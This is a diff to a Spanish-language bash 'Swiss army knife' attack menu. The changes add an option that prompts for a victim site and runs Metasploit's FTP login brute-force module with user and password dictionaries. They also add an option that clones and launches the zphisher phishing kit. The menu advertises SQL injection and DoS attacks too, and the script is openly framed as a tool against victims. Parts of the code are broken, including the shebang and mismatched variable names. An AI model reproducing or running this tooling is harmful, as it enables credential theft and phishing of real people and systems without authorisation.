@@ -1,7 +1,7 @@
 #3/bin/bash
 #proyecto NAVAJA SUIZA
 #ilia
-
+clear
 
 echo -e "\e[1;30m Este proyecto es una multi herraminta au nen proceso de varias funciones las cuales podras ver\e[0m"
 sleep 5s
@@ -31,8 +31,9 @@ echo -e "\e[1;34m   [2]\e[0m \e[1;34mEXPLOIT\e[0m"
 echo -e "\e[1;34m   [3]\e[0m \e[1;34mANALIZADOR DE WEB\e[0m"
 echo -e "\e[1;34m   [4]\e[0m \e[1;34mINJECCION SQL\e[0m"
 echo -e "\e[1;34m   [5]\e[0m \e[1;34mATAQUE DOS\e[0m"
-echo -e "\e[1;34m   [6]\e[0m \e[1;34mATAQUE FUERZA BRUTA(EN CREACION)\e[0m"
-echo -e "\e[1;34m   [7]\e[0m \e[1;34mSALIR\e[0m"
+echo -e "\e[1;34m   [6]\e[0m \e[1;34mATAQUE FUERZA BRUTA\e[0m"
+echo -e "\e[1;34m   [7]\e[0m \e[1;34mPHISING(no es de metasloit, asi que se instalara una herramienta que no es mia)\e[0m"
+echo -e "\e[1;34m   [8]\e[0m \e[1;34mSALIR\e[0m"
 read opcion
 case $opcion in
 1)
@@ -107,8 +108,10 @@ case $opcion in
   echo -e "\e[1;31mNo se que me pides...\e[0m"
 
   exit 0
+  read enterkey
   ;;
-
+  esac
+  done
 2)
   sleep 2s
   while :
@@ -167,7 +170,8 @@ case $opcion in
    echo -e "\e[1;31mNo se que me pides...\e[0m"
 
    exit 0
-   ;;
+ read enterkey
+ ;;
 3)
   sleep 2.5s 
   echo -n -e "\e[1;34mAÑADE EL SITIO WEB DE LA VICTIMA:\e[0m"
@@ -220,11 +224,46 @@ case $opcion in
   read enterkey
   ;;
 6)
- clear
- exit 0
- read Internet
+  sleep 2.5s 
+  echo -n -e "\e[1;34mAÑADE EL SITIO WEB DE LA VICTIMA:\e[0m"
+  read IP
+  sleep 1s
+  echo -n -e "\e[1;34mESCOJEMOS VICTIMA PARA ESCANEAR(anadir nombre de host):\e[0m"
+  read HOST
+  sleep 1s
+  echo -n -e "\e[1;34mCANTIDAD DE ATAQUES:\e[0m"
+  read THREADS
+  sleep 1s 
+  echo -n -e "\e[1;34mDICCIONARIO DE USUARIOS:\e[0m"
+  read users
+  sleep 1s
+  echo -n -e "\e[1;34mDICCIONARIO DE CONTRESEÑAS:\e[0m"
+  read password
+  sleep 1s
+  sudo service postgresql start
+  sleep 1s 
+  clear
+  msfconsole -x "use auxiliary/scanner/ftp/ftp_login;\
+  nmap -F $host;\
+  set RHOSTS $IP;\
+  set THREADS $THREADS;\
+  set USER_FILE $users;\
+  set PASS_FILE $password;\
+  run"
+  read enterkey
  ;;
+
 7)
+  sleep 2.5s
+
+  apt update
+  apt install git curl php wget -y
+  git clone git://github.com/htr-tech/zphisher.git
+  cd zphisher
+  bash zphisher.sh
+ read enterkey
+ ;;
+8)
  clear
  exit 0
  read enterkey
@@ -235,8 +274,8 @@ case $opcion in
  echo -e "\e[1;31mNo te entiedno...\e[0m"
 
  exit 0
-;;
-esac
-echo "Gracias por usar esta herramienta"
-sleep 4s
-done 
+ read enterkey
+ ;;
+
+ esac 
+done
